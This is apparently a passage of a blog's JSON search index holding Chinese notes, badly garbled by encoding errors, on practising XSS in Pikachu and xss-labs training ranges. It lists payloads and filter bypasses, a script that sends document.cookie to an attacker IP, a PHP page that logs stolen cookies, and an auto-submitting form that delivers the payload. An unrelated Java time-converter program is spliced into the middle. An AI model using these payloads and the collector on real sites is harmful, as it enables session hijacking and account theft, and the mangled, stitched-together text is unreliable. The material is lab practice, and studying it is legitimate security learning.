å‡ºç°å¼¹æ¡†çª—å£ï¼Œæ‰§è¡ŒæˆåŠŸ å­˜å‚¨å‹æ‰§è¡Œï¼Œç‚¹å‡»å…¶ä»–å»é¡µé¢è¿”å›ä»ç„¶ä¼šæ˜¾ç¤º DOMDOMå…¨ç§°æ˜¯DocumentObjectModelï¼Œä¹Ÿå°±æ˜¯æ–‡æ¡£å¯¹è±¡æ¨¡å‹ ==é€šè¿‡jsä»£ç æ“ä½œæ–‡æ¡£å¯¹è±¡æ¨¡å‹è§¦å‘çš„æ¼æ´ 1xxx' onclick=&quot;alert('xss')&quot;&gt; domå‹xss-x æºä»£ç  12345678910 function domxss(){ var str = window.location.search; var txss = decodeURIComponent(str.split(&quot;text=&quot;)[1]); var xss = txss.replace(/\\+/g,' ');// alert(xss); document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href='&quot;+xss+&quot;'&gt;å°±è®©å¾€äº‹éƒ½éšé£,éƒ½éšé£å§&lt;/a&gt;&quot;; } //è¯•è¯•ï¼š'&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert('xss')&quot;&gt; //è¯•è¯•ï¼š' onclick=&quot;alert('xss')&quot;&gt;,é—­åˆæ‰å°±è¡Œ 1'onclick=&quot;alert('xss')&quot; å¯èƒ½è§¦å‘DOMå‹XSSçš„jsæ“ä½œï¼š 12345document.refererwindow.namelocationinnerHTMLdocument.write é—­åˆæ ‡ç­¾ 1234'onclick=&quot;alert(1111)&quot;'onclick=&quot;alert('xss')&quot;&gt;'&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert('xss')&quot;&gt;&lt;a href=&quot;'&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;&gt;what do you see?&lt;/a&gt; å·¥å…·æµ‹è¯• è‡ªåŠ¨åŒ–å·¥å…·AWVSï¼ŒAPPscanï¼Œxrayç­‰å¤§å‹å·¥å…·ï¼Œxssstrike æ‰‹å·¥æµ‹è¯• å®æˆ˜è¿‡ç¨‹ï¼šæƒ³è¦ç›—å–åˆ«äººçš„cookieä¿¡æ¯çš„è¯æœ‰ä¸€ä¸ªå‰ææ¡ä»¶ï¼Œå°±æ˜¯ä½ åº”è¯¥åœ¨åˆ«äººè§¦å‘ä½ çš„xssæ”»å‡»æ—¶ï¼Œä½ çš„ä»£ç åº”è¯¥å°†æ”¶é›†hJkieä¿¡æ¯å‘é€ç»™ä½ çš„å¹³å°æ¥æ¥æ”¶ï¼Œè¿™æ ·æ‰è·å–åˆ°äº†æ•°æ® 12&quot;&gt;&lt;script&gt;document.location ='http://192.168.0.15/pikachu/pkxss/xcookie/cookie.php?cookie='+document.cookie;&lt;/script&gt; è¿™ä¸ªip192.168.0.15æ˜¯é»‘å®¢ipç„¶åè¿™é‡Œå› ä¸ºæœ‰ç‚¹éº»çƒ¦ï¼Œæˆ‘å°±ç›´æ¥åœ¨æœ¬æœºä¸Šæ“ä½œäº†è·å–cookieçš„ä»£ç  1234567891011121314151617181920&lt;?phpinclude_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';$link=connect();//è¿™ä¸ªæ˜¯è·å–cookieçš„apié¡µé¢if(isset($_GET['cookie'])){ $time=date('Y-m-d g:i:s'); $ipaddress=getenv ('REMOTE_ADDR'); $cookie=$_GET['cookie']; $referer=$_SERVER['HTTP_REFERER']; $useragent=$_SERVER['HTTP_USER_AGENT']; $query=&quot;insert cookies(time,ipaddress,cookie,referer,useragent) values('$time','$ipaddress','$cookie','$referer','$useragent')&quot;; $result=mysqli_query($link, $query);}header(&quot;Location:http://192.168.1.4/pikachu/index.php&quot;);//é‡å®šå‘åˆ°ä¸€ä¸ªå¯ä¿¡çš„ç½‘ç«™?&gt; æ§åˆ¶å° 1location.href='www.baidu.com'; ç»™æŸä¸ªç½‘å€å‘è¯·æ±‚ï¼Œè·³è½¬åˆ°ç½‘å€ 1document.cookie 1location.href='http:jd.com?cookie='document.cookie; é»‘å®¢çš„ä¸»æœºè·‘ç½‘ç«™ xssçš„postè·å–cookieç™»å½• 1234567891011121314151617181920212223242526&lt;html&gt;&lt;head&gt;&lt;script&gt;window.onload = function() { document.getElementById(&quot;postsubmit&quot;).click();}&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php&quot;&gt; &lt;input id=&quot;xssr_in&quot; type=&quot;text&quot; name=&quot;message&quot; value= &quot;&lt;script&gt;document.location = 'http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=' + document.cookie; &lt;/script&gt;&quot; /&gt; &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;window.onload = function() { document.getElementById(&quot;postsubmit&quot;).click();} onloadå½“æµè§ˆå™¨åŠ è½½å®Œé¡µé¢æ‰€æœ‰å†…å®¹åè‡ªåŠ¨è§¦å‘æ‰§è¡Œ 12345678910111213141516171819202122232425import java.text.SimpleDateFormat;import java.util.Date;import java.util.Scanner;public class SimpleTimeConverter { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.print(&quot;è¯·è¾“å…¥13ä½çš„æ¯«ç§’æ•°: &quot;); long milliseconds = scanner.nextLong(); // åˆ›å»ºDateå¯¹è±¡ Date date = new Date(milliseconds); // åˆ›å»ºæ—¶é—´æ ¼å¼åŒ–å¯¹è±¡ï¼ˆ24å°æ—¶åˆ¶ï¼‰ SimpleDateFormat sdf = new SimpleDateFormat(&quot;HH:mm:ss&quot;); // æ ¼å¼åŒ–æ—¶é—´ String timeString = sdf.format(date); System.out.println(&quot;24å°æ—¶åˆ¶æ—¶é—´: &quot; + timeString); scanner.close(); }} ä¸€æ‰“å¼€å°±è®¿é—®æ¼æ´ä»£ç  level1ç”¨åç«¯è¯­è¨€phpæ¸²æŸ“htmlæ ‡ç­¾ 1http://xss:4556/level1.php?name=&lt;a href=&quot;http://baidu.com&quot;&gt;db&lt;/a&gt; ç›´æ¥ 1&lt;script&gt;alert()&lt;/script&gt; level2å¯¹è¿›è¡Œäº†base64 1window['alert'](&quot;å…ˆæŠ±çœŸå¸…&quot;) é¡µé¢æºä»£ç  å°è¯•é—­åˆæ„é€ æ–°è¯­å¥ 1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt; level31' onfocus=javascript:alert() ' onfocusäº‹ä»¶åœ¨å…ƒç´ è·å¾—ç„¦ç‚¹æ—¶è§¦å‘ï¼Œæœ€å¸¸ä¸&lt;input&gt;ã€&lt;select&gt; å’Œ &lt;a&gt; æ ‡ç­¾ä¸€èµ·ä½¿ç”¨ï¼Œä»¥ä¸Šé¢å›¾ç‰‡çš„htmlæ ‡ç­¾&lt;input&gt;ä¸ºä¾‹ï¼Œ&lt;input&gt;æ ‡ç­¾æ˜¯æœ‰è¾“å…¥æ¡†çš„ï¼Œç®€å•æ¥è¯´ï¼Œonfocusäº‹ä»¶å°±æ˜¯å½“è¾“å…¥æ¡†è¢«ç‚¹å‡»çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘myFunction()å‡½æ•°ï¼Œç„¶åæˆ‘ä»¬å†é…åˆjavascriptä¼ªåè®®æ¥æ‰§è¡Œjavascriptä»£ç  level4 å°è¯•ç”¨åŒå¼•å·é—­åˆ 1&quot; onfocus=javascript:alert() &quot; level5 1?keyword=&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot; level6 å°è¯•å¤§å°å†™ç»•è¿‡ 123&quot;&gt; &lt;a hRef=javascript:alert()&gt;x&lt;/a&gt; &lt;&quot;&quot; Onfocus=javascript:alert() &quot;&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot; level7åŒæ‹¼å†™ç»•è¿‡","link":"/2025/12/13/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"javaï¼Œä»£ç å®¡è®¡","slug":"javaï¼Œä»£ç å®¡è®¡","link":"/tags/java%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"webå®‰å…¨","slug":"webå®‰å…¨","link":"/tags/web%E5%AE%89%E5%85%A8/"}],"categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","link":"/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"wafç»•è¿‡","slug":"wafç»•è¿‡","link":"/categories/waf%E7%BB%95%E8%BF%87/"}],"pages":[{"title":"","text":"google-site-verification: google0ce01516f2d5551f.html","link":"/google0ce01516f2d5551f.html"},{"title":"categories","text":"","link":"/categories/index.html"}]}